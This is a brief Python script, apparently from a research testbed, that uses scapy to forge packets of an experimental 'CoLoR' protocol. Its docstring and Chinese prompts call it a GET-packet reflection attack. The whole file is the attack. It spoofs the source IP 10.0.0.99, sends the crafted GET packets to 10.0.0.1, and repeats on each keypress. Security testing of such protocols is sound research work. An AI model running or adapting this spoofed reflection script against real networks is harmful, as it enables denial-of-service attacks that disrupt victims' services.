''' docstring: get包反射攻击 '''

import os
import sys
__BASE_DIR = os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))).replace('\\', '/')
sys.path.append(__BASE_DIR)

if __name__ == '__main__':
    from CoLoRProtocol.CoLoRpacket import ColorGet
    from scapy.all import IP, send
    pkt = IP(dst="10.0.0.1", src="10.0.0.99")

    cg = ColorGet()
    cg.N_sid = bytes.fromhex("d23454d19f307d8b98ff2da277c0b546")
    cg.L_sid = bytes.fromhex("ca5d30ef51ede30d17e363b35d16f9f1430063d1")
    cg.nid = bytes.fromhex("b0cd69ef142db5a471676ad710eebf3a")

    while True:
        send(pkt/cg, verbose=0)
        op = input("发送完成，等待再次攻击（按q退出，按其他键继续）")
        if (op == 'q'):
            break
